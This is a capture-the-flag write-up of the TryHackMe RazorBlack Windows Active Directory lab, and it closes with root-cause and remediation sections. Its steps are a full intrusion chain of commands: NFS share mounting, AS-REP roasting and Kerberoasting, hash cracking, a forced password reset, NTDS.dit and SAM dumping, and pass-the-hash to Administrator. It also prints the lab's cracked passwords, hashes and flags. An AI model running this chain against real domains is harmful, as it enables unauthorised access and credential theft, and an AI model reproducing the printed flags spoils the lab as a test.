# Write-up: RazorBlack lab (Medium) on THM

This document is a structured security write-up based on hands-on exploitation of the **RazorBlack** lab on TryHackMe website: https://tryhackme.com/room/raz0rblack

**Date**: January 20, 2026  
**Source**: TryHackMe — RazorBlack & Personal Hands-On Practice

---

## Summary

The **RazorBlack** lab features a Windows-based **Active Directory** environment where initial entry was gained through an **insecure NFS** (Network File System) share. By mounting the /users share, **sensitive employee data was exfiltrated**, leading to the discovery of a valid username list. Subsequent Kerberoasting and AS-REP roasting, combined with a password spray and a forced password change for the user **sbradley**, allowed for lateral movement across SMB shares. After retrieving a protected ZIP file containing a **NTDS.dit** database backup, an offline credential dump provided the NTLM hash for the user **lvetrova**, granting WinRM access and ultimately a path to escalate to **Administrator** by leveraging **SeBackupPrivilege** on the account **xyan1d3**.

---

## Technical Overview
### 1. Discovery

By first, information gathering via Nmap:  
```bash
nmap -sC -sV -v -p- 10.82.151.164
```

Result:  
<img width="520" height="602" alt="nmap" src="https://github.com/user-attachments/assets/356f67a0-8a56-4e63-8cb3-935dde55b12c" />

**Domain Name**:  
```text
raz0rblack.thm
```

/etc/hosts:  
10.82.151.164 raz0rblack.thm

---

```text
2049/tcp  open  nlockmgr
```

**nlockmgr** — Network Lock Manager, service used by Network File System to manage file locking across a network.

Let's check it out:  
```bash
showmount -e 10.82.151.164
```

Result:  
<img width="354" height="71" alt="NLMusers" src="https://github.com/user-attachments/assets/baaf555c-f7ad-4169-a301-7e77857c0f2b" />

*Mount it.*

```bash
mkdir /mnt/nlockmgr
```

```bash
mount -t nfs 10.82.151.164:/users /mnt/nlockmgr -o nolock
```

```bash
cd /mnt/nlockmgr
```

<img width="403" height="53" alt="NLMlsla" src="https://github.com/user-attachments/assets/0359ba32-1a04-4e85-aa60-5c432607712d" />

---

sbradley.txt:  
<img width="444" height="79" alt="sbradley" src="https://github.com/user-attachments/assets/e5457284-ca79-4ab6-8075-95c4e3f78cba" />

**Steven's Flag**:  
```text
THM{ab53e05c9a98def00314a14ccbfa8104}
```

employee_status.xlsx:  
<img width="630" height="367" alt="ESxlsx" src="https://github.com/user-attachments/assets/56b2a7ac-e74f-4ec5-9321-b45b40b45683" />

```bash
nano usernames.txt
```

usernames.txt:  
```text
sbradley
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
clin
```

---

```bash
./kerbrute_linux_amd64 userenum -d raz0rblack.thm --dc 10.82.151.164 usernames.txt
```

Result:  
<img width="961" height="379" alt="kerb" src="https://github.com/user-attachments/assets/e04ef77e-b2aa-4fe4-b027-509a00d758fd" />

users.txt:  
```text
lvetrova
sbradley
twilliams
```

```bash
impacket-GetNPUsers raz0rblack.thm/ -dc-ip 10.82.151.164 -usersfile users.txt -format hashcat -outputfile hashes.txt
```

hashes.txt:  
<img width="1024" height="162" alt="hashes1" src="https://github.com/user-attachments/assets/f0c209f1-fc3c-485b-93bd-2c75a8921541" />

```bash
hashcat -m 18200 hashes.txt /usr/share/eaphammer/wordlists/rockyou.txt
```

<img width="1920" height="759" alt="hashcat1" src="https://github.com/user-attachments/assets/caf33fca-8477-4f8d-a565-f80714cefae5" />

Here we go:  
```text
twilliams:roastpotatoes
```

---

```bash
nxc smb 10.82.151.164 -u 'twilliams' -p 'roastpotatoes'
```

Result:  
```text
[+] raz0rblack.thm\twilliams:roastpotatoes
```

```bash
smbmap -u 'twilliams' -p 'roastpotatoes' -H 10.82.151.164
```

Result:  
<img width="1239" height="236" alt="smb1" src="https://github.com/user-attachments/assets/29fa710c-0af5-4e9e-8b66-9a3ae8341fd6" />

---

```bash
smbclient //10.82.151.164/NETLOGON -U twilliams%'roastpotatoes'
```

```bash
smbclient //10.82.151.164/SYSVOL -U twilliams%'roastpotatoes'
```

*Nothing interesting there.*

---

Check the password for another users:  
```bash
crackmapexec smb raz0rblack.thm -u usernames.txt -p roastpotatoes --shares
```

Result:  
```text
[-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE
```

*Interesting. Let's change the password for this user.*

---

```bash
python3 smbpasswd.py sbradley@10.82.151.164
```

Result:  
<img width="781" height="182" alt="passchng" src="https://github.com/user-attachments/assets/401bf31c-274e-496f-a7ed-97ca16bfd8d2" />

```text
sbradley:pass12345
```

```bash
nxc smb 10.82.151.164 -u 'sbradley' -p 'pass12345'
```

Result:  
```
[+] raz0rblack.thm\sbradley:pass12345
```

```bash
smbmap -u sbradley -p 'pass12345' -H 10.82.151.164
```

Result:  
<img width="1251" height="238" alt="map1" src="https://github.com/user-attachments/assets/f4a5bd63-26a8-4bf6-91db-6dcf98dc0cca" />

In the "trash" directory:  
<img width="845" height="242" alt="trash" src="https://github.com/user-attachments/assets/df4530a9-f6a2-497d-85a0-7ccfcb0491a6" />

```shell
mget *
```

---

<img width="1919" height="447" alt="chat" src="https://github.com/user-attachments/assets/4b6ce642-212c-4857-86c2-5bc00e9475b7" />

```bash
zip2john experiment_gone_wrong.zip > ziphash.txt
```

```bash
john ziphash.txt
```

Here we go:  
```text
experiment_gone_wrong.zip:electromagnetismo
```

**The zip file's password**:  
```text
electromagnetismo
```

<img width="129" height="91" alt="zip" src="https://github.com/user-attachments/assets/325d019d-8d71-4484-8cdc-37f349cbc724" />

---

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | tee dump.txt
```

Clean it up:  
```bash
cat dump.txt | cut -d ":" -f 4 > clean_dump.txt
```

<img width="369" height="385" alt="dump" src="https://github.com/user-attachments/assets/f7d12459-d9df-467e-a794-cb7493dbb232" />

---

```bash
crackmapexec smb 10.82.151.164 -u usernames.txt -H clean_dump.txt
```

Result:  
```text
[+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d
```

**Ljudmila's Hash**:  
```text
f220d3988deb3f516c73f40ee16c431d
```

---

### 2. Penetration

```bash
evil-winrm -i 10.82.151.164 -u 'lvetrova' -H 'f220d3988deb3f516c73f40ee16c431d'
```

<img width="1428" height="418" alt="ew1" src="https://github.com/user-attachments/assets/4c6e398d-b2e3-449c-af08-74fc87d5a971" />

<img width="820" height="423" alt="lvetrova" src="https://github.com/user-attachments/assets/86b6608f-509f-420e-9701-87d52fd828e4" />

```shell
Get-Content lvetrova.xml
```

<img width="1920" height="358" alt="xml1" src="https://github.com/user-attachments/assets/36908af6-83e4-47c1-b3bc-e0120166dae7" />

```shell
$creds = Import-Clixml -Path .\lvetrova.xml
```

```shell
$creds.GetNetworkCredential().password
```

<img width="875" height="66" alt="lvetrovaflag" src="https://github.com/user-attachments/assets/77ac5397-713c-41db-86aa-393e112c2d49" />

**Ljudmila's Flag**:  
```text
THM{694362e877adef0d85a92e6d17551fe4}
```

---

Kerberoast it:  
```bash
impacket-GetUserSPNs raz0rblack.thm/lvetrova -dc-ip 10.82.151.164 -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -request
```

Result:  
<img width="1920" height="511" alt="xyan1" src="https://github.com/user-attachments/assets/531bf887-f372-47f6-9276-7bf114397ba5" />

```bash
hashcat -m 13100 xyan.txt /usr/share/eaphammer/wordlists/rockyou.txt
```

Result:  
<img width="1920" height="396" alt="xyanhash" src="https://github.com/user-attachments/assets/6f60d586-f93e-435c-97ff-0c33c821e73a" />

**Xyan1d3's password**:  
```text
xyan1d3:cyanide9amine5628
```

---

### 3. Escalation

```bash
evil-winrm -i 10.82.151.164 -u 'xyan1d3' -p 'cyanide9amine5628'
```

```shell
$creds = Import-Clixml -Path .\xyan1d3.xml
```

```shell
$creds.GetNetworkCredential().password
```

<img width="1920" height="447" alt="xyanflag" src="https://github.com/user-attachments/assets/052aa00f-a055-4da4-bbd0-3784b726eca9" />

**Xyan1d3's Flag**:  
```text
THM{62ca7e0b901aa8f0b233cade0839b5bb}
```

---

```shell
whoami /priv
```

Result:  
<img width="768" height="284" alt="xyanpriv" src="https://github.com/user-attachments/assets/642c5158-4456-430d-8509-5ec09bc86428" />

Xyan has SeBackupPrivilege and SeRestorePrivilege -> download sam.bak and system.bak

*Info: Download successful!*

```bash
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

Result:  
<img width="967" height="204" alt="secretsdump" src="https://github.com/user-attachments/assets/9e11d0eb-c756-459a-bd17-28a7ef13c2b6" />

---

```bash
evil-winrm -i 10.82.151.164 -u 'Administrator' -H '9689931bed40ca5a2ce1218210177f0c'
```

*Success.*

<img width="1430" height="709" alt="rootxml" src="https://github.com/user-attachments/assets/e8604534-b9d1-46e7-a9cb-7c3527afae0d" />

```shell
$creds = Import-Clixml -Path .\root.xml
```

<img width="1920" height="579" alt="xmlwrong" src="https://github.com/user-attachments/assets/95a1cc09-7a16-48c5-a985-ac17e3b13008" />

*Something wrong. Let's figure it out.*

---

https://gchq.github.io/CyberChef

<img width="1920" height="972" alt="chefmagic" src="https://github.com/user-attachments/assets/915b9b2c-aacc-4483-b83f-e86a5e1ea39e" />

*There is hex format.*

<img width="1920" height="975" alt="HEX" src="https://github.com/user-attachments/assets/6c41e052-4d0a-4c18-a746-28890ac632e5" />

**The root Flag**:  
```text
THM{1b4f46cc4fba46348273d18dc91da20d}
```

---

```shell
gci -recurse -filter "top*"
```

Result:  
<img width="1052" height="611" alt="top" src="https://github.com/user-attachments/assets/395d2f1b-d950-49e2-aed0-61fef44e4bd0" />

<img width="1920" height="1030" alt="topsecret" src="https://github.com/user-attachments/assets/f1e7d685-875f-49d6-a812-679a5acf4d7d" />

**The way to exit vim is**:  
```text
:wq
```

---

## Security Failures & Root Causes Classification

* **Insecure Network Shares** — Misconfigured NFS Permissions — **High** Impact — The /users directory was exported via NFS with insufficient access controls, allowing any unauthenticated network user to mount the drive and harvest internal usernames and documents.
* **Credential Exposure in Backups** — Protected Sensitive Files — **Critical** Impact — A backup of the Active Directory database (ntds.dit) was stored in a ZIP file within a "trash" SMB share; although password-protected, the weak encryption allowed for a brute-force attack, exposing all domain hashes.
* **Weak Account Policy** — Password Must Change Status — **Medium** Impact — The account **sbradley** was identified with a **STATUS_PASSWORD_MUST_CHANGE** flag, which allowed an attacker to remotely set a new password via SMB and gain authorized access to further internal shares.
* **Excessive Privileges** — SeBackup & SeRestore Privileges — **High** Impact — The user **xyan1d3** was assigned high-level backup privileges; these rights were leveraged to dump the SAM and SYSTEM hives, allowing for a Pass-the-Hash attack to gain **full Administrator control**.

---

## Remediation Recommendations

* **Audit and Secure** NFS Exports by restricting access to specific authorized IP addresses and ensuring that sensitive user directories are not shared publicly without strict authentication.
* **Implement** Stronger Encryption for all administrative backups and ensure that sensitive files like ntds.dit are stored in highly restricted, offline, or vaulted locations rather than general-purpose file shares.
* **Enforce** Tiered Administration to ensure that service accounts or standard users (like xyan1d3) do not possess dangerous privileges like SeBackupPrivilege unless absolutely necessary for their specific role.
* **Monitor** Active Directory for anomalous behavior, such as a sudden surge in Kerberos ticket requests (Kerberoasting) or the unauthorized remote use of the smbpasswd functionality to reset user credentials.

---

## Conclusion

> The compromise of the RazorBlack domain demonstrates how minor configuration oversights in peripheral services — like NFS — can provide the leverage needed to topple an entire Active Directory infrastructure. While the attacker began with no credentials, the ability to harvest usernames and exploit a misconfigured "Password Must Change" status created a domino effect. This lab serves as a powerful reminder that internal security relies not just on strong passwords, but on the principle of least privilege and the rigorous protection of sensitive system backups.

---

*Write-up compiled based on TryHackMe RazorBlack (https://tryhackme.com/room/raz0rblack) lab.*
